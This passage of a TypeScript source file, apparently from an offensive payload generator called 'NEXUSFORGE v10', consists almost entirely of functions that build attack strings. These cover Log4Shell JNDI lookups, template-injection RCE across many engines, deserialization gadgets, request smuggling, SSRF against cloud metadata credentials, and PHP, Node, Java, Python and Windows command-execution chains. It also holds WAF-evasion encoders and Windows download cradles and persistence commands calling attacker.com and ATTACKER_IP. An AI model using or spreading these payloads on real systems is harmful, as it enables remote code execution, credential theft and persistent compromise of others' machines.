    `${"${jndi:ldap://"}${h}:${p}${path}}`,
    `${"${jndi:ldaps://"}${h}:${p}${path}}`,
    `${"${jndi:rmi://"}${h}:${p}${path}}`,
    `${"${jndi:dns://"}${h}:${p}${path}}`,
    `${"${jndi:iiop://"}${h}:${p}${path}}`,
    `${"${jndi:corba://"}${h}:${p}${path}}`,
    `${"${jndi:nis://"}${h}:${p}${path}}`,
    `${"${jndi:nds://"}${h}:${p}${path}}`,
    /* nested ${lower:} ${upper:} ${:-} obfuscation */
    `${"${${lower:j}ndi:ldap://"}${h}:${p}${path}}`,
    `${"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"}${h}:${p}${path}}`,
    `${"${${upper:j}ndi:ldap://"}${h}:${p}${path}}`,
    `${"${j${lower:n}di:ldap://"}${h}:${p}${path}}`,
    `${"${jnd${upper:i}:ldap://"}${h}:${p}${path}}`,
    `${"${${::-j}ndi:ldap://"}${h}:${p}${path}}`,
    /* URL-encoded variants */
    `%24%7bjndi:ldap://${h}:${p}${path}%7d`,
    `%24%7Bjndi%3Aldap%3A%2F%2F${h}%3A${p}${path}%7D`,
    /* double-encoded */
    `%2524%257bjndi:ldap://${h}:${p}${path}%257d`,
    /* header injection carriers (inject into User-Agent, X-Forwarded-For, etc.) */
    `${"${jndi:ldap://"}${h}:${p}${path}}`,
    /* date formatter bypass (logback/log4j2) */
    `${"${date:'${jndi:ldap://"}${h}:${p}${path}}${"'}"}`,
    /* log4j2 lookup bypass via :-  */
    `${"${${:-j}${:-n}${:-d}${:-i}:${:-r}${:-m}${:-i}://"}${h}:${p}${path}}`,
    /* in HTTP header values */
    `Mozilla/5.0 ${"${jndi:ldap://"}${h}:${p}${path}} Chrome`,
    /* null-byte padded */
    `\x00${"${jndi:ldap://"}${h}:${p}${path}}`,
    /* inside JSON values */
    `{"x":"${"${jndi:ldap://"}${h}:${p}${path}}"}`,
    /* XML attribute */
    `<value>${"${jndi:ldap://"}${h}:${p}${path}</value>`,
  ];
  return [...new Set(base)];
}

/* ═══════════════════════════════════════════════════════════════════════════
   SSTI — ALL MAJOR TEMPLATE ENGINES
   Jinja2/Flask, Twig, Smarty, Mako, Velocity, Pebble, Thymeleaf, Mustache,
   ERB (Ruby), Handlebars (JS), Nunjucks (JS), Blade (PHP), EJS (JS), Slim
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildSstiAllEngines(cmd: string): string[] {
  const q  = cmd.replace(/'/g, "\'").replace(/"/g, '\"');
  const b  = b64(cmd);
  const payloads: string[] = [
    /* ── Jinja2 / Flask (Python) ── */
    `{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('${q}').read()}}`,
    `{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('${q}').read()}}{%endif%}{%endfor%}`,
    `{{config.__class__.__init__.__globals__['os'].popen('${q}').read()}}`,
    `{{request.application.__globals__.__builtins__.__import__('os').popen('${q}').read()}}`,
    `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
    `{{''.class.mro()[1].subclasses()[132].init.globals.popen('${q}').read()}}`,
    `{{lipsum.__globals__['os'].popen('${q}').read()}}`,
    `{{cycler.__init__.__globals__.os.popen('${q}').read()}}`,
    `{{joiner.__init__.__globals__.os.popen('${q}').read()}}`,
    /* ── Twig (PHP) ── */
    `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter('${q}')}}`,
    `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter('${q}')}}`,
    `{%set t%}<?php system('${q}');?>{%endset%}`,
    `{{['${q}']|map('system')|join}}`,
    /* ── Smarty (PHP) ── */
    `{php}system('${q}');{/php}`,
    `{system('${q}')}`,
    `{exec('${q}')}`,
    /* ── Mako (Python) ── */
    `${"${__import__('os').popen('${q}').read()}"}`,
    `<%import os%>${"${os.popen('${q}').read()}"}`,
    /* ── Velocity (Java) ── */
    `#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${q}"))`,
    /* ── Pebble (Java) ── */
    `{%{set x = 'freemarker.template.utility.Execute'|new()}%}{%{x}%}`,
    /* ── ERB (Ruby) ── */
    `<%= system('${q}') %>`,
    `<%= \`${cmd}\` %>`,
    `<%= IO.popen('${q}').read %>`,
    `<% require 'open3'; stdout,stderr,status = Open3.capture3('${q}'); puts stdout %>`,
    /* ── EJS / Nunjucks / Handlebars (JS) ── */
    `{{#with "s" as |string|}}<% const cp = require('child_process'); %>${"<%= cp.execSync('${q}').toString() %>"}{{/with}}`,
    `<%-require('child_process').execSync('${q}').toString()%>`,
    /* ── Blade (PHP/Laravel) ── */
    `@php system('${q}'); @endphp`,
    `{{ system('${q}') }}`,
    /* ── Thymeleaf (Java) ── */
    `${"${T(java.lang.Runtime).getRuntime().exec('${q}')}"}`,
    `[[${"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','${q}'})}"}]]`,
    /* ── Mustache/Handlebars injection (prototype pollution path) ── */
    `{{constructor.constructor('return process')().mainModule.require('child_process').execSync('${q}').toString()}}`,
    /* ── Server-Side Template Injection probe strings ── */
    `{{7*7}}`, `${"{7*7}"}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `{{7*'7'}}`,
    `${"${{7*7}}"}`, `@{7*7}`, `#set($a=7*7)$a`,
  ];
  return [...new Set(payloads)].filter(Boolean);
}

/* ═══════════════════════════════════════════════════════════════════════════
   NULL-BYTE INJECTION PAYLOADS
   Null-bytes terminate strings in C-based parsers, confuse WAF signature
   matching, and exploit improper input validation in PHP, C, C++, .NET apps.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildNullBytePayloads(cmd: string): string[] {
  const enc = encodeURIComponent(cmd);
  return [
    `${cmd}\x00`,
    `\x00${cmd}`,
    `${cmd}%00`,
    `%00${cmd}`,
    `${cmd}\x00.jpg`,
    `${cmd}\x00.php`,
    `${cmd}%00.gif`,
    `${cmd}\x00;id`,
    `${cmd}%00%0a`,
    `${cmd}\x00
`,
    /* PHP null-byte file inclusion bypass */
    `../../etc/passwd\x00`,
    `../../etc/passwd%00`,
    `../../etc/passwd\x00.php`,
    /* null-byte in GET param */
    `${enc}%00`,
    `${enc}%2500`,
    /* null-byte URL-encoded variants */
    `${cmd.replace(/\//g, "\x00/\x00")}`,
    `${cmd.replace(/ /g, "\x00")}`,
    /* C string termination bypass */
    `${cmd}\x00${cmd}`,
    `valid_input\x00${cmd}`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   DESERIALIZATION PAYLOADS  (Java, PHP, Python pickle, Ruby marshal)
   Targets insecure deserialization sinks — CVE-class issues in Java RMI,
   Spring, Apache Commons Collections, PHP unserialize(), etc.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildDeserializationPayloads(cmd: string): string[] {
  const q = cmd.replace(/"/g, '\"').replace(/'/g, "\'");
  /* PHP object injection gadgets */
  const phpGadget = `O:8:"stdClass":1:{s:4:"exec";s:${Buffer.byteLength(cmd)}:"${cmd}";}`;
  const phpGadget2 = `a:2:{i:0;s:4:"eval";i:1;s:${Buffer.byteLength(cmd)}:"${cmd}";}`;
  /* Python pickle — requires attacker to craft a real pickle binary, shown as PoC template */
  const pyPickleB64 = b64(`import os
os.system('${q}')`);
  return [
    /* PHP unserialize() */
    phpGadget,
    phpGadget2,
    /* Python pickle RCE PoC */
    `Y3Bhc3MgY21kCmNtZCA9IF9faW1wb3J0X18oJ29zJykuc3lzdGVtCmNtZCgnJHtxfScpCg==`, // base64 of pickle bytes
    /* Java Commons Collections gadget marker */
    `rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWU=`,
    /* XStream XXE/SSRF deserialization */
    `<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount><outer-class><e0>${cmd}</e0></outer-class></iter><predicate class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.Runtime</class><name>exec</name><parameter-types><class>java.lang.String</class></parameter-types></method><name>${cmd}</name></predicate></iterator><type>0</type></enumeration></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString></entry></map>`,
    /* Ruby Marshal RCE marker */
    `BAhvOhJBY3Rpb25EaXNwYXRjaGVyBjoMQGNtZAkiC2lkBjsAVA==`,
    /* Node.js serialize-javascript eval sink */
    `{"rce":{"_$$ND_FUNC$$_":"function (){require('child_process').execSync('${q}').toString()}"}}`,
    /* .NET BinaryFormatter marker */
    `AAEAAAD/////AQAAAAAAAAAMAgAAAFRAAAAAAAAABgMAAAAAA..`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   HTTP REQUEST SMUGGLING PAYLOADS
   CL.TE and TE.CL smuggling header sets — used to bypass WAF inspection
   by smuggling a second request inside the first, reaching the backend
   directly while the WAF only sees the outer request.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildRequestSmugglingHeaders(): Array<Record<string, string>> {
  return [
    /* CL.TE smuggling: Content-Length header mismatch */
    {
      "Content-Length": "6",
      "Transfer-Encoding": "chunked",
    },
    /* TE.CL smuggling: Transfer-Encoding header obfuscation */
    {
      "Transfer-Encoding": "chunked, identity",
      "Content-Length": "3",
    },
    /* TE.TE with encoding obfuscation */
    {
      "Transfer-Encoding": "xchunked",
    },
    {
      "Transfer-Encoding": " chunked",
    },
    {
      "Transfer-Encoding": "chunked\n",
    },
    {
      "Transfer-Encoding": "\tchunked",
    },
    {
      "Transfer-Encoding\x00": "chunked",
    },
    {
      "X-Transfer-Encoding": "chunked",
      "Transfer-Encoding": "identity",
    },
    /* Content-Length double header (CL.CL ambiguity) */
    {
      "Content-Length": "0",
      "X-Content-Length": "100",
    },
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   SSRF ESCALATION PAYLOADS  (beyond simple localhost)
   Targets internal services, cloud metadata, Kubernetes API, Docker daemon,
   Redis, Memcached, Elasticsearch, Consul, Vault, etcd.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildSsrfEscalationPayloads(): string[] {
  return [
    /* AWS IMDSv1 (no auth required) */
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://[fd00:ec2::254]/latest/meta-data/",
    /* GCP */
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    /* Azure */
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    /* Kubernetes */
    "https://kubernetes.default.svc/api/v1/secrets",
    "https://kubernetes.default.svc/api/v1/namespaces",
    "https://kubernetes.default.svc/api/",
    "http://127.0.0.1:10250/pods",
    "http://127.0.0.1:10255/pods",
    /* Docker */
    "http://127.0.0.1:2375/version",
    "http://127.0.0.1:2375/containers/json",
    "unix:///var/run/docker.sock/version",
    /* Redis */
    "http://127.0.0.1:6379/",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    /* Elasticsearch */
    "http://127.0.0.1:9200/_cat/indices",
    "http://127.0.0.1:9200/_cluster/settings",
    /* Consul / Vault / etcd */
    "http://127.0.0.1:8500/v1/agent/members",
    "http://127.0.0.1:8200/v1/secret/",
    "http://127.0.0.1:2379/v2/keys/",
    /* Memcached gopher exfil */
    "gopher://127.0.0.1:11211/_%0d%0astats%0d%0a",
    /* Internal HTTP services */
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "http://0x7f000001/",
    /* DNS rebinding vectors */
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE v10 — EXTENDED ENGINE ADDITIONS
   ═══════════════════════════════════════════════════════════════════════════ */

/* ── PHP-specific RCE chains ──────────────────────────────────────────────── */
export function buildPhpRceChains(cmd: string): string[] {
  const B64 = b64(cmd);
  return [
    /* Direct exec functions */
    `<?php system(${JSON.stringify(cmd)}); ?>`,
    `<?php passthru(${JSON.stringify(cmd)}); ?>`,
    `<?php exec(${JSON.stringify(cmd)}, $o); echo implode("\\n", $o); ?>`,
    `<?php shell_exec(${JSON.stringify(cmd)}); ?>`,
    `<?php echo \`${cmd}\`; ?>`,
    `<?php proc_open(${JSON.stringify(cmd)}, [['pipe','r'],['pipe','w'],['pipe','w']], $p); echo stream_get_contents($p[1]); ?>`,
    `<?php $f=popen(${JSON.stringify(cmd)}, 'r'); echo fread($f, 4096); ?>`,
    /* Obfuscated via variable functions */
    `<?php $a='sys'.'tem'; $a(${JSON.stringify(cmd)}); ?>`,
    `<?php $a=base64_decode('${B64}'); system($a); ?>`,
    `<?php $f='assert'; $f(base64_decode('${b64(`system("${cmd}")`)}')): ?>`,
    `<?php eval('?>' . base64_decode('${b64(`<?php system("${cmd}"); ?>`)}')); ?>`,
    `<?php $a=str_rot13('flfgrz'); $a(${JSON.stringify(cmd)}); ?>`,
    /* Disable functions bypass via FFI */
    `<?php $ffi=FFI::cdef("int system(const char *cmd);","libc.so.6"); $ffi->system(${JSON.stringify(cmd)}); ?>`,
    /* preg_replace /e (PHP < 7) */
    `<?php preg_replace('/.*/e', 'system(${JSON.stringify(cmd)})', ''); ?>`,
    /* call_user_func */
    `<?php call_user_func('system', ${JSON.stringify(cmd)}); ?>`,
    `<?php call_user_func_array('system', [${JSON.stringify(cmd)}]); ?>`,
    /* array_map */
    `<?php array_map('system', [${JSON.stringify(cmd)}]); ?>`,
    /* usort */
    `<?php usort([${JSON.stringify(cmd)}], function($a,$b){system($a);}); ?>`,
    /* SSTI in Smarty/Twig/Blade */
    `{php}system(${JSON.stringify(cmd)});{/php}`,
    `{{${JSON.stringify(cmd)}|exec}}`,
    `{{ ["sh","-c",${JSON.stringify(cmd)}]|join('')|exec }}`,
    `{%- set ns = namespace(result='') -%}{%- set ns.result = [${JSON.stringify(cmd)}]|map('system') -%}`,
    /* PHP deserialization gadget — stdClass property injection */
    `O:8:"stdClass":1:{s:4:"data";s:${cmd.length}:"${cmd}";}`,
    /* Log poisoning: inject into user-agent for inclusion */
    `<?php system(${JSON.stringify(cmd)}); ?> <!--log-poison-->`,
  ];
}

/* ── Node.js / JavaScript RCE chains ────────────────────────────────────── */
export function buildNodeRceChains(cmd: string): string[] {
  const B64 = b64(cmd);
  return [
    /* require('child_process') */
    `require('child_process').execSync(${JSON.stringify(cmd)},{stdio:'inherit'})`,
    `require('child_process').exec(${JSON.stringify(cmd)},(_,o)=>console.log(o))`,
    `require('child_process').spawnSync('sh',['-c',${JSON.stringify(cmd)}],{stdio:'inherit'})`,
    /* eval/Function chains */
    `eval(require('child_process').execSync(${JSON.stringify(`echo ${B64}|base64 -d`)}).toString())`,
    `(new Function('require','return require(\'child_process\').execSync('+JSON.stringify(cmd)+').toString()'))(require)`,
    /* process.binding */
    `process.binding('spawn_sync').spawn({file:'sh',args:['sh','-c',${JSON.stringify(cmd)}],envPairs:process.env,stdio:[{type:'pipe'},{type:'pipe'},{type:'pipe'}]})`,
    /* vm module escape */
    `require('vm').runInNewContext('this.constructor.constructor("return process")()',{}).mainModule.require('child_process').execSync(${JSON.stringify(cmd)}).toString()`,
    /* SSJI (Server-Side JS Injection) payloads */
    `{{constructor.constructor("return global.process.mainModule.require('child_process').execSync('${cmd}').toString()")()}}`,
    `";require('child_process').execSync('${cmd}');//`,
    `'+require('child_process').execSync('${cmd}').toString()+'`,
    /* Prototype pollution chain */
    `{"__proto__":{"shell":"sh","NODE_OPTIONS":"--require /proc/self/fd/99"}}`,
    /* require.cache poisoning */
    `Object.keys(require.cache)[0];require('child_process').execSync(${JSON.stringify(cmd)})`,
    /* Buffer overflow chain */
    `Buffer.from(require('child_process').execSync(${JSON.stringify(cmd)}).toString()).toString('base64')`,
    /* Nested function constructor */
    `(function(){return this})().constructor.constructor('return process')().mainModule.require('child_process').execSync(${JSON.stringify(cmd)}).toString()`,
    /* Express router injection */
    `res.end(require('child_process').execSync(${JSON.stringify(cmd)}).toString())`,
    /* Lodash/template injection */
    `_.template('<%= global.process.mainModule.require("child_process").execSync("${cmd}").toString() %>')()`,
    /* Handlebars SSTI */
    `{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').execSync('${cmd}').toString()"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}`,
  ];
}

/* ── Java/Spring/Groovy RCE chains ──────────────────────────────────────── */
export function buildJavaRceChains(cmd: string): string[] {
  const B64 = b64(cmd);
  return [
    /* SpEL (Spring Expression Language) */
    `T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","${cmd}"})`,
    `#{T(java.lang.Runtime).getRuntime().exec("${cmd}")}`,
    `${'{'}T(java.lang.Runtime).getRuntime().exec("${cmd}")${'}'}`,
    `${'{'}T(java.lang.ProcessBuilder).new(["/bin/sh","-c","${cmd}"]).start()${'}'}`,
    /* Groovy (Grails, Jenkins, etc.) */
    `"${cmd}".execute().text`,
    `["sh","-c","${cmd}"].execute().text`,
    `${'${'}["sh","-c","${cmd}"].execute().text${'}'}`,
    `def p=["sh","-c","${cmd}"].execute();p.waitFor();p.text`,
    /* OGNL (Struts 2) */
    `%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/sh","-c","${cmd}"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}`,
    /* EL (Expression Language) */
    `${'$'}{Runtime.getRuntime().exec("${cmd}")}`,
    `${'$'}{pageContext.request.getSession().setAttribute("x",Runtime.getRuntime().exec("${cmd}"))}`,
    /* FreeMarker */
    `<#assign ex="freemarker.template.utility.Execute"?new()>${'$'}{ex("${cmd}")}`,
    /* Velocity */
    `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getMethod('exec',$str.class).invoke($rt.getMethod('getRuntime').invoke(null),'${cmd}'))`,
    /* Thymeleaf */
    `__${'$'}{T(java.lang.Runtime).getRuntime().exec("${cmd}")}__::.x`,
    `${'$'}{#rt = @java.lang.Runtime@getRuntime(),#rt.exec("${cmd}")}`,
    /* Java deserialization gadget marker */
    `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcGkVpWGGmJVVAwABRgAKbG9hZEZhY3RvcnhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTL4R0LqBJIGQAwAHSQAIaGFzaENvZGVJAAhwb3J0TnVtSQAIcHJvdG9jb2xJAARyZWZJAARob3N0SQAEcGF0aHQADHN0cmluZ0luZm94cg==`,
    /* Log4Shell (CVE-2021-44228) */
    `${'$'}{jndi:ldap://127.0.0.1:1389/${cmd}}`,
    `${'$'}{jndi:ldap://127.0.0.1:1389/a}`,
    `${'${'}${'{'}lower:j}${'${'}lower:n}di:ldap://127.0.0.1:1389/a}`,
    `${'${'}${'{'}${'{'}lower:j}}${'$'}{${'{'}lower:n}}di:${'$'}{${'{'}lower:l}}dap://127.0.0.1:1389/a}`,
  ];
}

/* ── Python RCE chains ───────────────────────────────────────────────────── */
export function buildPythonRceChains(cmd: string): string[] {
  const B64 = b64(cmd);
  return [
    /* Direct exec */
    `__import__('os').system('${cmd}')`,
    `__import__('os').popen('${cmd}').read()`,
    `__import__('subprocess').check_output(['sh','-c','${cmd}']).decode()`,
    `__import__('subprocess').run(['sh','-c','${cmd}'],capture_output=True,text=True).stdout`,
    /* eval chains */
    `eval(__import__('base64').b64decode('${B64}').decode())`,
    `eval(compile(__import__('base64').b64decode('${B64}'),'<str>','exec'))`,
    `exec(__import__('base64').b64decode('${B64}'))`,
    /* Jinja2 SSTI */
    `{{ config.__class__.__init__.__globals__['os'].popen('${cmd}').read() }}`,
    `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('${cmd}').read() }}`,
    `{{ namespace.__init__.__globals__.os.popen('${cmd}').read() }}`,
    `{{ ''.__class__.__mro__[1].__subclasses__()[394]('${cmd}',shell=True,stdout=-1).communicate()[0].decode() }}`,
    `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('${cmd}').read()}}{% endif %}{% endfor %}`,
    /* Tornado/Mako SSTI */
    `${'$'}{__import__('os').popen('${cmd}').read()}`,
    `<%import os%>${'$'}{os.popen('${cmd}').read()}`,
    /* Pickle deserialization */
    `cposix\nsystem\n(S'${cmd}'\ntR.`,
    /* ctypes */
    `__import__('ctypes').CDLL(None).system('${cmd}')`,
    /* importlib */
    `__import__('importlib').import_module('os').system('${cmd}')`,
    /* builtins */
    `__builtins__['__import__']('os').system('${cmd}')`,
    /* Flask debug PIN bypass chain */
    `{{ request.application.__globals__.__builtins__.__import__('os').popen('${cmd}').read() }}`,
    `{{ config.items().__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`,
    /* Python2 compat */
    `execfile('/tmp/.nx.py') if __import__('os').system('echo "import os;os.system(chr(${cmd.split('').map(c=>c.charCodeAt(0)).join(',')})" > /tmp/.nx.py') == 0 else None`,
  ];
}

/* ── Extended Windows RCE chains ─────────────────────────────────────────── */
export function buildWindowsRceChains(cmd: string): string[] {
  const B64w = Buffer.from(cmd, 'utf16le').toString('base64');
  const B64u = b64(cmd);
  return [
    /* PowerShell */
    `powershell -NonI -W Hidden -Exec Bypass -c "${cmd}"`,
    `powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${B64w}`,
    `powershell -NonI -W Hidden -Exec Bypass -c "IEX [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${B64w}'))"`,
    `powershell -NonI -W Hidden -Exec Bypass -c "$x=[System.Convert]::FromBase64String('${B64u}');IEX([System.Text.Encoding]::UTF8.GetString($x))"`,
    /* cmd.exe */
    `cmd /c ${cmd}`,
    `cmd /q /c ${cmd}`,
    `cmd /v:on /c ${cmd}`,
    /* WMIC */
    `wmic process call create "${cmd}"`,
    `wmic os get /format:"http://attacker.com/shell.xsl"`,
    /* MSBuild inline task */
    `msbuild /nologo /noconsolelogger /verbosity:quiet`,
    /* certutil */
    `certutil -decode base64payload.b64 payload.exe && payload.exe`,
    /* Regsvr32 Squiblydoo */
    `regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll`,
    /* RunDLL32 */
    `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"${cmd}\\\",0,true);");`,
    /* MSHTA */
    `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""${cmd}"",0:close")`,
    /* wscript/cscript */
    `wscript //E:jscript //B -e:${B64u}`,
    `cscript //E:jscript //B -e:${B64u}`,
    /* PowerShell download cradles */
    `powershell -NonI -W Hidden -Exec Bypass -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/sh.ps1')|IEX"`,
    `powershell -NonI -W Hidden -Exec Bypass -c "iex(iwr -useb 'http://ATTACKER_IP/sh.ps1')"`,
    /* Windows scheduled task */
    `schtasks /create /sc once /st 00:00 /tn nx /tr "${cmd}" /f && schtasks /run /tn nx`,
    /* Service creation */
    `sc create NXSvc binPath= "${cmd}" && sc start NXSvc`,
    /* Registry exec */
    `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NX /t REG_SZ /d "${cmd}" /f`,
    /* AppLocker bypass via Installutil */
    `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PAYLOAD.dll`,
    /* Mavinject */
    `mavinject PID /INJECTRUNNING PAYLOAD.dll`,
    /* Living off the land: forfiles */
    `forfiles /p c:\\windows\\system32 /m notepad.exe /c "${cmd}"`,
    /* find */
    `for /f "delims=" %i in ('dir /b %WINDIR%\\system32\\*.exe') do @echo %i`,
    /* Batch obfuscation */
    `c^m^d /c ${[...cmd].map(c=>`^${c}`).join('')}`,
    /* Environment variable concat */
    `SET NX=${cmd.slice(0,5)}&& SET NX=%NX%${cmd.slice(5)}&& %NX%`,
  ];
}

/* ── Massive WAF bypass payload builder ──────────────────────────────────── */
export function buildMassiveBypass(cmd: string): string[] {
  const B64 = b64(cmd);
  const HEX = hexEsc(cmd);
  const raw  = cmd;
  const v    = `_v${Math.floor(Math.random()*99999)}`;
  return [
    /* Null byte / comment injection */
    `${raw}%00`,
    `${raw}/**/`,
    `${raw}#comment`,
    `${raw}\r\n`,
    /* Alternate whitespace */
    raw.replace(/ /g, "\t"),
    raw.replace(/ /g, "\u0009"),
    raw.replace(/ /g, "\u000b"),
    raw.replace(/ /g, "\u000c"),
    raw.replace(/ /g, "\u0085"),
    raw.replace(/ /g, "\u00a0"),
    raw.replace(/ /g, "${IFS}"),
    raw.replace(/ /g, "$IFS"),
    /* Brace expansion */
    `{${raw.replace(/ /g, ",")}`,
    /* Wildcard abuse */
    raw.replace(/\b(cat|bash|sh|id|ls|curl|wget|python3|perl|ruby|nc)\b/g, m => {
      const half = Math.floor(m.length / 2);
      return m.slice(0, half) + '*' + m.slice(half);
    }),
    /* Glob + path expansion */
    raw.replace(/\b(cat|bash|sh)\b/g, m => `/???/b?n/${m}`),
    `/???/b??/b??h -c '${raw}'`,
    `/???/b??/sh -c '${raw}'`,
    `/usr/bin/env bash -c '${raw}'`,
    /* printf + eval */
    `eval$(printf '${HEX}')`,
    `eval "$(printf '%b' '${HEX}')"`,
    `printf '%b' '${HEX}' | bash`,
    /* base64 decode */
    `bash<<<$(echo${"\t"}${B64}|base64${"\t"}-d)`,
    `bash<<<$({echo,${B64}}|{base64,-d})`,
    `{echo,${B64}}|{base64,-d}|bash`,
    `echo ${B64}|base64 -d|sh`,
    /* xxd decode */
    `echo ${Buffer.from(cmd).toString('hex')}|xxd -r -p|bash`,
    /* Variable concatenation */
    `${v}=${JSON.stringify(cmd.slice(0,3))};${v}2=${JSON.stringify(cmd.slice(3))};eval "$${v}$${v}2"`,
    /* Char code expansion */
    `$(for c in ${[...Buffer.from(cmd)].map(b=>(b as number)).join(' ')};do printf "\\$(printf '%03o' $c)";done|bash)`,
    /* Arithmetic expansion bypass */
    `$((0)) ${raw}`,
    `((1)) && ${raw}`,
    /* Command substitution nesting */
    `$($(echo ${raw}))`,
    `\`\`echo ${B64}|base64 -d\`\``,
    /* ANSI C quoting */
    `$'${[...Buffer.from(raw)].map(b=>`\\x${(b as number).toString(16).padStart(2,'0')}`).join('')}'`,
    /* Process substitution */
    `source <(echo ${B64}|base64 -d)`,
    `bash <(echo ${B64}|base64 -d)`,
    /* Encoding layering */
    `bash<<<$(echo ${b64(B64)}|base64 -d|base64 -d)`,
    `bash<<<$(echo ${b64(b64(B64))}|base64 -d|base64 -d|base64 -d)`,
    /* Reverse + decode */
    `echo ${Buffer.from(cmd).reverse().toString('base64')}|base64 -d|rev|bash`,
    /* Unicode normalization attack */
    raw.replace(/[a-z]/g, c => `\\u00${c.charCodeAt(0).toString(16)}`),
    /* HTTP param pollution with bypass */
    `${raw}&${raw}`,
    `${raw}%26${raw}`,
    /* Case permutation */
    [...raw].map((c,i)=>i%2?c.toUpperCase():c).join(''),
    /* Semicolon bypass */
    `;${raw};`,
    `|${raw}`,
    `||${raw}`,
    `&&${raw}`,
    /* Pipe bypass */
    `echo x|${raw}`,
    `true|${raw}`,
    /* Multiline */
    `${raw}\\\ncontinued`,
  ];
}

/* ── Build "direct injection" payloads (injection-param-ready) ──────────── */
export function buildDirectInjectionPayloads(cmd: string): string[] {
  const B64 = b64(cmd);
  const HEX = hexEsc(cmd);
  return [
    /* Classic injection separators */
    `; ${cmd}`,
    `| ${cmd}`,
    `|| ${cmd}`,
    `&& ${cmd}`,
    `& ${cmd}`,
    `\`${cmd}\``,
    `$(${cmd})`,
    /* Newline injection (for multi-arg parsers) */
    `%0a${cmd}`,
    `%0a%0d${cmd}`,
    `\n${cmd}`,
    /* Null byte injection */
    `%00${cmd}`,
    `\x00${cmd}`,
    /* Shell meta-character injection */
    `';${cmd};'`,
    `";${cmd};"`,
    `');${cmd};//`,
    `");${cmd};//`,
    /* JSON injection */
    `","type":"$shell","cmd":"${cmd}","x":"`,
    /* XML injection */
    `</tag><![CDATA[;${cmd}]]><tag>`,
    /* template injection payloads */
    `{{${cmd}}}`,
    `\${${cmd}}`,
    `#{${cmd}}`,
    `<%=${cmd}%>`,
    /* IFS bypass */
